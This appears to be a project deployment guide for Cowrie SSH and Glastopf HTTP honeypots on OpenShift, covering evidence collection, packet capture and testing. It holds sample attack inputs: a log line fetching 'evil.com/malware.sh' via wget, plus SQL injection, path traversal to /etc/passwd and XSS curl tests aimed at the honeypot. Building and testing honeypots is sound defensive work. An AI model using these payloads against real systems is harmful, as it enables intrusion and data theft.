# Phase 5: Honeypot Deployment Guide

This guide covers deploying Cowrie (SSH) and Glastopf (HTTP) honeypots as Kubernetes workloads with evidence collection.

---

## Why Kubernetes Honeypots?

**Phase 1-4** redirected attackers, but had no honeypot to capture interactions:
- ❌ No SSH/HTTP honeypot to receive redirected traffic
- ❌ No evidence collection (commands, payloads, session logs)
- ❌ No TTP extraction from attacker behavior
- ❌ Docker Compose not allowed in OpenShift (SCC restrictions)

**Phase 5 (Kubernetes Honeypots)** solves this:
- ✅ Cowrie SSH honeypot - logs commands, sessions, downloads
- ✅ Glastopf HTTP honeypot - emulates web app vulnerabilities
- ✅ Kubernetes StatefulSets with persistent storage
- ✅ Evidence collector sidecar uploads logs to database
- ✅ PCAP capture for network forensics
- ✅ Works with Istio VirtualService redirection (Phase 4)

---

## Quick Start

```bash
# 1. Deploy Cowrie SSH honeypot
oc apply -f k8s/honeypot-cowrie.yaml

# 2. Deploy Glastopf HTTP honeypot
oc apply -f k8s/honeypot-glastopf.yaml

# 3. Deploy unified honeypot service
oc apply -f k8s/honeypot-service.yaml

# 4. (Optional) Deploy evidence collector
oc apply -f k8s/evidence-collector.yaml

# 5. (Optional) Deploy PCAP capture
oc apply -f k8s/pcap-capture.yaml

# 6. Verify honeypots running
oc get pods -n cyber-riposte -l component=honeypot

# 7. Test SSH honeypot
ssh -p 2222 root@<cowrie-service-ip>
# Try password: admin, root, password

# 8. Test HTTP honeypot
curl http://<glastopf-service-ip>:8080/
```

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│ Istio VirtualService (Phase 4)                              │
│ Routes attacker traffic to honeypot-service                 │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
                    ┌──────────────────┐
                    │ honeypot-service │
                    │ (ClusterIP)      │
                    │                  │
                    │ - HTTP: 8080     │
                    │ - SSH: 22        │
                    │ - Telnet: 23     │
                    └──────────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        ▼                     ▼                     ▼
┌─────────────┐       ┌─────────────┐       ┌─────────────┐
│ Cowrie SSH  │       │ Glastopf    │       │ Evidence    │
│ StatefulSet │       │ HTTP        │       │ Collector   │
│             │       │ StatefulSet │       │ (reads logs)│
│ Logs:       │       │             │       │             │
│ - JSON      │       │ Logs:       │       │ Uploads to: │
│ - Commands  │       │ - HTTP req  │       │ - Database  │
│ - Sessions  │       │ - Payloads  │       │ - S3        │
│ - Downloads │       │ - SQL inj   │       │             │
└─────────────┘       └─────────────┘       └─────────────┘
      │                     │                     │
      ▼                     ▼                     ▼
┌─────────────────────────────────────────────────────────┐
│ Persistent Volumes (PVCs)                               │
│ - cowrie-logs (10GB)                                    │
│ - cowrie-downloads (5GB)                                │
│ - glastopf-logs (10GB)                                  │
│ - evidence-storage (20GB)                               │
└─────────────────────────────────────────────────────────┘
```

---

## Honeypot Components

### 1. Cowrie SSH Honeypot

**What it does**:
- Emulates SSH server (port 2222 → remapped to 22 via Service)
- Logs all commands executed by attacker
- Captures session recordings (asciinema format)
- Saves malware downloads
- Emulates fake filesystem with fake users

**Key features**:
- Medium-interaction (executes some commands, fakes others)
- JSON logging for structured analysis
- Weak password authentication (admin, root, password)
- Fake system info (hostname, kernel, users)

**Log format** (cowrie.json):
```json
{
  "eventid": "cowrie.session.connect",
  "src_ip": "203.0.113.42",
  "src_port": 54321,
  "dst_ip": "10.128.1.50",
  "dst_port": 2222,
  "session": "abc123",
  "timestamp": "2024-06-15T03:14:07.123Z"
}
{
  "eventid": "cowrie.login.success",
  "username": "root",
  "password": "admin",
  "session": "abc123",
  "timestamp": "2024-06-15T03:14:09.456Z"
}
{
  "eventid": "cowrie.command.input",
  "input": "wget http://evil.com/malware.sh",
  "session": "abc123",
  "timestamp": "2024-06-15T03:14:12.789Z"
}
```

### 2. Glastopf HTTP Honeypot

**What it does**:
- Emulates vulnerable web application
- Logs HTTP requests (headers, body, payloads)
- Detects SQL injection, XSS, path traversal
- Responds with fake vulnerable pages
- Emulates popular CMS (WordPress, Joomla)

**Key features**:
- Emulates common vulnerabilities (SQLi, XSS, RCE)
- Dork database for search engine visibility
- Request/response logging
- Payload analysis

**Log format** (glastopf.log):
```
2024-06-15 03:15:01 [INFO] Request from 203.0.113.42
2024-06-15 03:15:01 [INFO] GET /admin/login.php HTTP/1.1
2024-06-15 03:15:01 [INFO] User-Agent: sqlmap/1.7.2
2024-06-15 03:15:01 [INFO] SQLi detected: ' OR 1=1--
2024-06-15 03:15:01 [INFO] Emulated vulnerability: SQL Injection
```

---

## Deployment

### 1. Deploy Cowrie SSH Honeypot

```bash
# Deploy Cowrie
oc apply -f k8s/honeypot-cowrie.yaml

# Check pod status
oc get pods -n cyber-riposte -l app=cowrie

# Wait for ready
oc wait --for=condition=ready pod -l app=cowrie -n cyber-riposte --timeout=300s

# Check logs
oc logs -f cowrie-0 -n cyber-riposte

# Exec into pod
oc exec -it cowrie-0 -n cyber-riposte -- /bin/bash
```

**What this deploys**:
- StatefulSet with 1 replica
- ConfigMap with cowrie.cfg
- 2 PVCs: cowrie-logs (10GB), cowrie-downloads (5GB)
- Service (SSH: 2222, Telnet: 2223)

### 2. Deploy Glastopf HTTP Honeypot

```bash
# Deploy Glastopf
oc apply -f k8s/honeypot-glastopf.yaml

# Check pod status
oc get pods -n cyber-riposte -l app=glastopf

# Wait for ready
oc wait --for=condition=ready pod -l app=glastopf -n cyber-riposte --timeout=300s

# Check logs
oc logs -f glastopf-0 -n cyber-riposte

# Test HTTP endpoint
GLASTOPF_IP=$(oc get svc glastopf -n cyber-riposte -o jsonpath='{.spec.clusterIP}')
curl http://$GLASTOPF_IP:8080/
```

**What this deploys**:
- StatefulSet with 1 replica
- ConfigMap with glastopf.cfg
- 2 PVCs: glastopf-logs (10GB), glastopf-data (5GB)
- Service (HTTP: 8080)

### 3. Deploy Unified Honeypot Service

```bash
# Deploy service
oc apply -f k8s/honeypot-service.yaml

# Verify service
oc get svc honeypot-service -n cyber-riposte

# Get service IP
oc get svc honeypot-service -n cyber-riposte -o jsonpath='{.spec.clusterIP}'
```

**What this does**:
- ClusterIP service (internal only)
- Exposes ports: 8080 (HTTP), 22 (SSH), 23 (Telnet)
- Selector matches both Cowrie and Glastopf pods
- This is the destination for Istio VirtualService redirects

---

## Evidence Collection

### 1. Deploy Evidence Collector

```bash
# Deploy collector
oc apply -f k8s/evidence-collector.yaml

# Check status
oc get pods -n cyber-riposte -l app=evidence-collector

# Check logs
oc logs -f deployment/evidence-collector -n cyber-riposte

# View collected evidence
oc exec deployment/evidence-collector -n cyber-riposte -- ls -lh /evidence/
```

**What it does**:
- Reads Cowrie and Glastopf log files every 60 seconds
- Extracts new entries since last check
- Saves to evidence-storage PVC
- Uploads to database (evidence table)

**Evidence files**:
- `/evidence/cowrie-YYYYMMDD-HHMMSS.json` - Cowrie session logs
- `/evidence/glastopf-YYYYMMDD-HHMMSS.log` - Glastopf HTTP logs

### 2. Deploy PCAP Capture (Optional)

```bash
# Deploy PCAP capture DaemonSet
oc apply -f k8s/pcap-capture.yaml

# Check DaemonSet
oc get daemonset pcap-capture -n cyber-riposte

# Check logs
oc logs daemonset/pcap-capture -n cyber-riposte

# View PCAP files (on node)
oc exec daemonset/pcap-capture -n cyber-riposte -- ls -lh /pcap/
```

**What it does**:
- Runs on every node (DaemonSet)
- Captures traffic to honeypot ports (8080, 2222, 2223)
- Rotates PCAP files hourly
- Compresses and retains for 7 days
- Saves to hostPath: `/var/log/cyber-riposte/pcap`

**Security note**: Requires `CAP_NET_RAW` and `CAP_NET_ADMIN` capabilities.

---

## Testing

### Test SSH Honeypot (Cowrie)

```bash
# Get Cowrie service IP
COWRIE_IP=$(oc get svc cowrie -n cyber-riposte -o jsonpath='{.spec.clusterIP}')

# SSH to honeypot (will be port 2222, not 22)
ssh -p 2222 root@$COWRIE_IP
# Try passwords: admin, root, password, 123456

# Inside honeypot, try commands:
whoami
uname -a
ls -la
wget http://example.com/test.sh
exit

# Check logs
oc logs cowrie-0 -n cyber-riposte | grep "cowrie.command.input"
```

### Test HTTP Honeypot (Glastopf)

```bash
# Get Glastopf service IP
GLASTOPF_IP=$(oc get svc glastopf -n cyber-riposte -o jsonpath='{.spec.clusterIP}')

# Test basic request
curl http://$GLASTOPF_IP:8080/

# Test SQL injection
curl "http://$GLASTOPF_IP:8080/admin/login.php?id=1' OR 1=1--"

# Test path traversal
curl "http://$GLASTOPF_IP:8080/../../../../etc/passwd"

# Test XSS
curl "http://$GLASTOPF_IP:8080/search?q=<script>alert(1)</script>"

# Check logs
oc logs glastopf-0 -n cyber-riposte | grep "SQLi detected"
```

### End-to-End Test with Istio Redirection

```bash
# 1. Generate fake attack event
python3 event-producer-sim.py --kafka localhost:9092 --scenario single --count 1

# 2. Wait for VirtualService creation
sleep 5

# 3. Verify VirtualService exists
oc get virtualservice -n cyber-riposte | grep redirect

# 4. Test HTTP traffic (should reach Glastopf)
GATEWAY_IP=$(oc get svc istio-ingressgateway -n istio-system -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
curl -H "X-Forwarded-For: 203.0.113.42" http://$GATEWAY_IP/

# 5. Check Glastopf received traffic
oc logs glastopf-0 -n cyber-riposte | tail -20

# 6. Check evidence collected
oc exec deployment/evidence-collector -n cyber-riposte -- ls -lh /evidence/
```

---

## Monitoring

### Check Honeypot Health

```bash
# All honeypot pods
oc get pods -n cyber-riposte -l component=honeypot

# Cowrie health
oc exec cowrie-0 -n cyber-riposte -- ps aux | grep cowrie

# Glastopf health
oc exec glastopf-0 -n cyber-riposte -- ps aux | grep glastopf
```

### View Logs

```bash
# Cowrie logs (real-time)
oc logs -f cowrie-0 -n cyber-riposte

# Glastopf logs (real-time)
oc logs -f glastopf-0 -n cyber-riposte

# Evidence collector
oc logs -f deployment/evidence-collector -n cyber-riposte

# PCAP capture
oc logs daemonset/pcap-capture -n cyber-riposte
```

### Query Evidence from Database

```bash
# List evidence entries
oc exec postgres-0 -n cyber-riposte -- psql -U mirror_agent -d mirror_audit -c \
  "SELECT incident_id, evidence_type, collected_at
   FROM evidence
   ORDER BY collected_at DESC
   LIMIT 10;"

# Get evidence for specific incident
oc exec postgres-0 -n cyber-riposte -- psql -U mirror_agent -d mirror_audit -c \
  "SELECT evidence_type, data
   FROM evidence
   WHERE incident_id = 'INC-2024-0615-0314';"
```

---

## Storage Management

### PVC Sizes

- **cowrie-logs**: 10GB (session logs, JSON events)
- **cowrie-downloads**: 5GB (malware downloads)
- **glastopf-logs**: 10GB (HTTP request logs)
- **glastopf-data**: 5GB (database, emulated files)
- **evidence-storage**: 20GB (collected evidence, PCAP)

### Check PVC Usage

```bash
# List all PVCs
oc get pvc -n cyber-riposte

# Check usage (exec into pod)
oc exec cowrie-0 -n cyber-riposte -- df -h /cowrie/var/log/cowrie
oc exec glastopf-0 -n cyber-riposte -- df -h /opt/glastopf/log
```

### Cleanup Old Logs

```bash
# Delete logs older than 7 days (Cowrie)
oc exec cowrie-0 -n cyber-riposte -- \
  find /cowrie/var/log/cowrie -name "*.json" -mtime +7 -delete

# Delete logs older than 7 days (Glastopf)
oc exec glastopf-0 -n cyber-riposte -- \
  find /opt/glastopf/log -name "*.log" -mtime +7 -delete
```

---

## Troubleshooting

### Honeypot Pod Not Starting

```bash
# Check pod status
oc describe pod cowrie-0 -n cyber-riposte

# Common issues:
# 1. PVC not bound - check PVC status
oc get pvc -n cyber-riposte

# 2. Image pull error - check image exists
oc describe pod cowrie-0 -n cyber-riposte | grep "Image"

# 3. ConfigMap not mounted - check volumes
oc get pod cowrie-0 -n cyber-riposte -o jsonpath='{.spec.volumes}'
```

### No Traffic Reaching Honeypot

```bash
# Check VirtualService routing
oc get virtualservice -n cyber-riposte

# Check honeypot-service exists
oc get svc honeypot-service -n cyber-riposte

# Test direct connection (bypass Istio)
HONEYPOT_IP=$(oc get svc honeypot-service -n cyber-riposte -o jsonpath='{.spec.clusterIP}')
curl http://$HONEYPOT_IP:8080/

# Check Istio sidecar injection
oc get pods -n cyber-riposte -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].name}{"\n"}{end}'
# Should see: istio-proxy container
```

### Evidence Not Being Collected

```bash
# Check evidence-collector pod
oc get pods -n cyber-riposte -l app=evidence-collector

# Check collector logs
oc logs deployment/evidence-collector -n cyber-riposte

# Check PVC mounts
oc exec deployment/evidence-collector -n cyber-riposte -- ls -lh /cowrie-logs/
oc exec deployment/evidence-collector -n cyber-riposte -- ls -lh /glastopf-logs/

# Common issue: PVC names
# Evidence collector expects: cowrie-logs-cowrie-0, glastopf-logs-glastopf-0
oc get pvc -n cyber-riposte | grep logs
```

---

## Security Considerations

### 1. Honeypot Isolation

- Honeypots are ClusterIP services (internal only)
- Only accessible via Istio VirtualService redirection
- No direct internet exposure

### 2. Resource Limits

- CPU/memory limits prevent resource exhaustion
- Storage quotas prevent disk fill attacks

### 3. PCAP Capture Privileges

- Requires `CAP_NET_RAW` + `CAP_NET_ADMIN`
- Runs on host network (hostNetwork: true)
- Consider limiting to specific nodes with `nodeSelector`

### 4. Evidence Retention

- Logs rotated and compressed
- 7-day retention policy
- Upload to S3/object storage for long-term retention (Phase 6+)

---

## Next Steps

After Phase 5 is working:

- **Phase 6**: OSINT resilience (Redis caching, rate limiting)
- **Phase 7**: Observability (Prometheus metrics, Istio traces)
- **Phase 8**: GitHub integration (auto-create issues with honeypot evidence)

---

## Summary

**Phase 5 Complete** when:

✅ Cowrie SSH honeypot running  
✅ Glastopf HTTP honeypot running  
✅ Unified honeypot-service deployed  
✅ Evidence collector monitoring logs  
✅ PCAP capture running (optional)  
✅ Attacker traffic reaches honeypot via Istio  
✅ SSH/HTTP interactions logged  
✅ Evidence uploaded to database  
✅ PVCs storing logs and downloads

The Mirror now has **fully functional honeypots** capturing attacker TTPs! 🍯
